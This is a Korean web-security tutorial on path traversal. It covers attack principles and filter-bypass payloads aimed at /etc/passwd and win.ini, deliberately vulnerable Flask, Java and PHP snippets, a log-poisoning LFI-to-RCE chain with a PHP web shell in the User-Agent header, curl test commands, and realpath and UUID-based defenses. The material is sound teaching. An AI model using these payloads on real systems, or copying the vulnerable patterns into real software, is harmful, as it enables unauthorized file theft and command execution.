---
title: "Path Traversal: 경로 순회로 서버 파일 탈취하기"
description: "경로 순회(디렉토리 탈출) 공격의 원리, ../를 이용한 다양한 우회 기법, 고위험 타겟 파일 목록, 그리고 realpath 검증과 파일명 화이트리스트로 완벽 방어하는 방법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-04"
archiveOrder: 10
type: "knowledge"
category: "Security"
tags: ["Path Traversal", "LFI", "웹 보안", "OWASP", "파일 접근 취약점", "디렉토리 탈출"]
featured: false
draft: false
---

[지난 글](/posts/websec-idor/)에서 IDOR를 집중 분석했습니다. 이번 글에서는 역시 접근 제어 취약점 계열인 **경로 순회(Path Traversal, Directory Traversal)**를 다룹니다. 서버가 파일 이름을 사용자 입력으로 받아 파일 시스템에 접근할 때, 검증 없이 `../` 시퀀스를 허용하면 허용된 디렉토리를 벗어나 서버의 임의 파일을 읽거나 쓸 수 있습니다.

## 경로 순회란?

`..`는 유닉스/Windows 파일 시스템에서 상위 디렉토리를 의미합니다. `../../../`를 반복하면 루트 디렉토리까지 이동할 수 있습니다. 애플리케이션이 파일 이름을 사용자 입력으로 받아 그대로 파일 경로에 사용하면, 공격자는 `../../../etc/passwd` 같은 페이로드로 허용된 디렉토리 밖의 파일에 접근할 수 있습니다.

```
# 정상 동작
GET /files?name=report.pdf
→ /app/uploads/report.pdf 읽기

# Path Traversal 공격
GET /files?name=../../../etc/passwd
→ /app/uploads/../../../etc/passwd
→ 정규화 후 /etc/passwd 읽기
```

![Path Traversal: 디렉토리 탈출 공격](/assets/posts/websec-path-traversal-attack.svg)

## 우회 기법

단순히 `../`를 필터링하는 것만으로는 불충분합니다. 다양한 우회 기법이 존재합니다:

```
# 기본
../../../etc/passwd

# URL 인코딩 (%2F = /)
..%2F..%2F..%2Fetc%2Fpasswd

# 이중 URL 인코딩 (%252F)
..%252F..%252F..%252Fetc%252Fpasswd

# 유니코드/UTF-8 인코딩
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# 역슬래시 (Windows)
..\..\..\windows\win.ini

# ../를 제거하는 필터 우회 (재조립)
....//....//....//etc//passwd
....//...//.....//etc//passwd

# 절대 경로 직접 시도
/etc/passwd
C:\windows\system32\drivers\etc\hosts

# null 바이트 (확장자 필터 우회, 구형 PHP)
../../../etc/passwd%00.jpg
```

## 실제 취약한 코드 패턴

```python
# Flask (취약)
@app.route('/download')
def download():
    filename = request.args.get('file')
    # ❌ 경로 검증 없이 직접 전송
    return send_from_directory('/app/uploads', filename)

# 주의: send_from_directory는 내부적으로 경로 검증을 하지만
# 구현에 따라 우회될 수 있으므로 항상 직접 검증 권장
```

```java
// Java Servlet (취약)
protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
    String filename = req.getParameter("file");
    File file = new File("/var/app/docs/" + filename);
    // ❌ 경로 검증 없음
    try (FileInputStream fis = new FileInputStream(file)) {
        // 파일 전송
    }
}
```

```php
// PHP (취약)
$file = $_GET['page'];
// ❌ include는 경로 순회 + 원격 파일 포함(RFI)까지 가능
include("/var/www/pages/" . $file . ".php");
```

## 방어 전략

![Path Traversal 방어: 실제 경로 검증](/assets/posts/websec-path-traversal-defense.svg)

**핵심: `realpath()`로 실제 경로를 구해 기준 디렉토리 내에 있는지 검증합니다.** 심볼릭 링크까지 해결한 절대 경로를 비교해야 우회가 불가능합니다.

```python
import os

def safe_open(filename: str, base_dir: str = '/app/uploads'):
    # realpath: 모든 ../, 심볼릭 링크, 중복 슬래시 해결
    base = os.path.realpath(base_dir)
    requested = os.path.realpath(os.path.join(base_dir, filename))
    
    # base + os.sep: /uploads 뒤에 /를 붙여 /uploads_evil 같은 경우도 차단
    if not requested.startswith(base + os.sep):
        raise PermissionError(f'허용되지 않은 경로: {filename}')
    
    return open(requested, 'rb')

# 사용
try:
    with safe_open(request.args.get('file')) as f:
        content = f.read()
except PermissionError:
    return HttpResponse(status=400)
```

```javascript
// Node.js
const path = require('path');
const fs = require('fs');

function safeReadFile(filename) {
  const uploadDir = path.resolve('/app/uploads');
  const resolved = path.resolve(uploadDir, filename);
  
  // 경계 검사: uploadDir로 시작하는지 확인
  if (!resolved.startsWith(uploadDir + path.sep)) {
    throw new Error('경로 순회 감지');
  }
  
  return fs.readFileSync(resolved);
}
```

**파일명 화이트리스트**: 파일명에서 경로 구분자를 완전히 제거합니다.

```python
import re

def sanitize_filename(filename: str) -> str:
    # 경로 구분자, .., 숨김 파일 접두사 제거
    basename = os.path.basename(filename)  # 마지막 파일명만 추출
    # 알파벳, 숫자, 하이픈, 언더스코어, 점만 허용
    safe = re.sub(r'[^a-zA-Z0-9\-_.]', '', basename)
    if safe.startswith('.'):  # 숨김 파일 방지
        safe = safe[1:]
    return safe
```

**파일 접근 최소화**: 사용자가 업로드한 파일을 직접 서빙하는 대신 UUID 기반 간접 참조를 사용합니다.

```python
# 파일 업로드 시 DB에 매핑 저장
class UploadedFile(models.Model):
    uuid = models.UUIDField(default=uuid.uuid4, unique=True)
    original_name = models.CharField(max_length=255)
    storage_path = models.CharField(max_length=500)  # 절대 경로, 외부 노출 안 함
    owner = models.ForeignKey(User, on_delete=models.CASCADE)

# 다운로드 시 UUID로만 접근
@login_required
def download_file(request, file_uuid):
    f = get_object_or_404(UploadedFile, uuid=file_uuid, owner=request.user)
    return FileResponse(open(f.storage_path, 'rb'))
    # storage_path는 사용자가 절대 제어할 수 없음
```

## LFI에서 RCE로 (Local File Inclusion → Remote Code Execution)

PHP 환경에서 경로 순회 + `include`/`require`가 결합되면 원격 코드 실행으로 이어질 수 있습니다:

```php
// LFI → RCE 공격 체인
// 1. 서버 로그에 PHP 코드를 주입
// User-Agent: <?php system($_GET['cmd']); ?>

// 2. LFI로 로그 파일 include
// ?page=../../../var/log/apache2/access.log

// 3. cmd 파라미터로 명령 실행
// ?page=../../../var/log/apache2/access.log&cmd=id
```

이를 방지하려면 파일 포함에 사용자 입력을 절대 사용하지 않고, PHP에서는 `allow_url_include = Off`를 설정합니다.

## 보안 테스트 체크리스트

```bash
# Burp Suite Intruder로 파일 이름 파라미터 퍼징
# 또는 OWASP ZAP의 자동 스캔

# 수동 테스트
curl "https://target.com/files?name=../../../etc/passwd"
curl "https://target.com/files?name=..%2F..%2F..%2Fetc%2Fpasswd"

# Windows 대상
curl "https://target.com/files?name=..\..\..\windows\win.ini"
```

경로 순회는 구현이 쉽고 발견도 쉽지만, 방어도 명확합니다. `realpath` 기반 경계 검증 + 파일명 새니타이즈 + UUID 간접 참조를 조합하면 완전히 차단할 수 있습니다.

---

**지난 글:** [IDOR: 불안전한 직접 객체 참조 완전 분석](/posts/websec-idor/)

<br>
읽어주셔서 감사합니다. 😊
